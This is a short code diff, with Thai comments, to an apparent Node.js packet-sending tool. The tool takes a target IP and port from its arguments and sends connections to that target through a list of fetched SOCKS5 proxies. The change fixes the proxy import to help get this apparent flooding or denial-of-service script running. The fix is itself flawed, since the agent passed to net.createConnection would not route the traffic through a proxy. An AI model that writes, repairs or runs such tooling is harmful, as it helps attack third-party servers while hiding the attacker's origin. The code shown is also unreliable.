@@ -1,5 +1,5 @@
 const axios = require('axios');
-const HttpsProxyAgent = require('https-proxy-agent');
+const { SocksProxyAgent } = require('socks-proxy-agent'); // แก้ไขการนำเข้า
 const net = require('net');
 
 // ตั้งค่า IP และพอร์ตจากอาร์กิวเมนต์
@@ -37,7 +37,7 @@ async function getProxies() {
 
 // ฟังก์ชันสำหรับส่งแพ็กเก็ตผ่าน proxy
 async function sendPackets(proxy) {
-    const agent = new HttpsProxyAgent(`socks5://${proxy}`);
+    const agent = new SocksProxyAgent(`socks5://${proxy}`); // แก้ไขที่นี่
     const socket = net.createConnection({ host: ip, port: port, agent: agent });
 
     socket.on('connect', () => {
